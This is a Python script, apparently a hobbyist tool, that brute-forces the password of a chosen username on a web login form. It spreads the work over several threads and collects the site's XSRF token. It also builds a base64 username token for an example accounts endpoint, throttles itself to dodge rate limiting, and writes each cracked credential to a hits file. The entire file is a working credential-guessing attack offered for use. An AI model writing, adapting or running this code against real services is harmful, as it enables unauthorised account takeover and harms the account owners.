# --- Auto-install dependencies ---
import subprocess
import sys

required = ['requests', 'beautifulsoup4', 'colorama', 'keyboard']
for package in required:
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=True
        )
    except subprocess.CalledProcessError as e:
        print(f"[❌] Failed to install {package}: {e}")

import requests
from bs4 import BeautifulSoup
import time
import argparse
import threading
import queue
from colorama import init, Fore
import keyboard
import string
import base64
from urllib.parse import urlparse, parse_qs

init(autoreset=True)

USE_EMOJIS = False

def type_out(text, delay=0.03):
    for char in text:
        try:
            sys.stdout.write(char)
        except UnicodeEncodeError:
            sys.stdout.write('?')
        sys.stdout.flush()
        time.sleep(delay)
    print()

class SimpleBruteForcer:
    def __init__(self, url, username, wordlist, threads=5):
        self.url = url
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.passwords = queue.Queue()
        self.success_flag = threading.Event()
        self.paused = threading.Event()
        self.paused.clear()
        self.stop_flag = threading.Event()
        self.load_wordlist()

    def load_wordlist(self):
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    cleaned = ''.join(char for char in line.strip() if char in string.printable)
                    if cleaned:
                        self.passwords.put(cleaned)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[💀] Wordlist loading interrupted by user.")

    def log_hit(self, username, password):
        try:
            with open("hits.txt", "a", encoding='utf-8') as f:
                f.write(f"[HIT] {self.url} | username: {username} | password: {password}\n")
        except Exception as e:
            print(Fore.GREEN + f"[Log Error] Failed to write hit: {e}")

    def attempt_login(self, session, password):
        try:
            print(Fore.CYAN + f"[🧠] Starting 2-step login for {self.username}...")

            # Manually generate base64-encoded ai token
            ai_token = base64.b64encode(self.username.encode()).decode()
            print(Fore.GREEN + f"[🔑] Generated AI token from username: {ai_token}")

            xsrf_token = session.cookies.get("xsrf_token")
            if not xsrf_token:
                # Try to fetch cookies with a GET
                session.get(self.url, headers={"User-Agent": "Mozilla/5.0"})
                xsrf_token = session.cookies.get("xsrf_token")

            if not xsrf_token:
                print(Fore.YELLOW + "[❌] XSRF token missing")
                return False

            post_url = f"https://accounts.example.com/accounts/v2/password?ai={ai_token}&continue=%2Faccounts%2Fwelcome"
            payload = {
                "password": password,
                "xsrf_token": xsrf_token,
                "continue": "/accounts/welcome"
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Referer": self.url,
                "Origin": "https://accounts.example.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9"
            }

            print(Fore.CYAN + f"[🚪] Attempting login with password: {password}")
            response = session.post(post_url, data=payload, headers=headers, timeout=10)

            time.sleep(1.5)  # delay to reduce 429 risk

            with open("last_response.html", "w", encoding='utf-8') as f:
                f.write(response.text)

            if "/accounts/welcome" in response.url or "account-identifier-root" not in response.text:
                print(Fore.GREEN + f"[✅] Password found: {password}")
                self.log_hit(self.username, password)
                self.success_flag.set()
                return True
            else:
                print(Fore.RED + f"[❌] Incorrect: {password}")
                return False

        except Exception as e:
            print(Fore.RED + f"[Error] {e}")
            return False

    def worker(self):
        while not self.passwords.empty() and not self.success_flag.is_set() and not self.stop_flag.is_set():
            if self.paused.is_set():
                time.sleep(0.5)
                continue

            password = self.passwords.get()
            print(Fore.YELLOW + f"[THREAD] Trying: {password}")
            session = requests.Session()
            if self.attempt_login(session, password):
                return
            time.sleep(1.5)  # throttle thread loop too

    def control_listener(self):
        print(Fore.GREEN + "[🎮] Control listener active: CTRL+P = pause/resume, CTRL+C = quit.")
        while not self.stop_flag.is_set() and not self.success_flag.is_set():
            try:
                if keyboard.is_pressed("ctrl+p"):
                    if self.paused.is_set():
                        print(Fore.GREEN + "\n▶️ Resuming attack...")
                        self.paused.clear()
                    else:
                        print(Fore.GREEN + "\n⏸️ Pausing attack...")
                        self.paused.set()
                    time.sleep(1)
                elif keyboard.is_pressed("ctrl+c"):
                    print(Fore.RED + "\n[💥] CTRL+C detected. Exiting now...")
                    self.stop_flag.set()
                    sys.exit(0)
            except:
                continue
            time.sleep(0.1)

    def run(self):
        try:
            print(Fore.GREEN + f"🚀 Launching brute-force with {self.threads} threads")
            listener = threading.Thread(target=self.control_listener, daemon=True)
            listener.start()

            thread_list = []
            for _ in range(self.threads):
                t = threading.Thread(target=self.worker)
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join()

            if not self.success_flag.is_set():
                print(Fore.RED + "❌ No valid password found.")
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] CTRL+C detected. Stopping threads...")
            self.stop_flag.set()

if __name__ == "__main__":
    print(Fore.GREEN + r"""
   ____             _       _                
  |  _ \ ___  _ __ | |_ ___| |__   ___ _ __  
  | |_) / _ \| '_ \| __/ __| '_ \ / _ \ '__| 
  |  _ < (_) | |_) | || (__| | | |  __/ |    
  |_| \_\___/| .__/ \__\___|_| |_|\___|_|    
             |_|      v1.1 by joshyboo25
""")

    type_out(Fore.GREEN + ("Script started"))

    parser = argparse.ArgumentParser(description="Stylized brute-force example")
    parser.add_argument("url", help="Login URL")
    parser.add_argument("username", help="Username to target")
    parser.add_argument("wordlist", help="Password wordlist file")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default is 5)")
    args = parser.parse_args()

    type_out(Fore.GREEN + ("Connecting to: " + args.url))
    type_out(Fore.GREEN + ("Username: " + args.username))
    type_out(Fore.GREEN + ("Wordlist: " + args.wordlist + "\n"))

    bf = SimpleBruteForcer(args.url, args.username, args.wordlist, args.threads)
    bf.run()






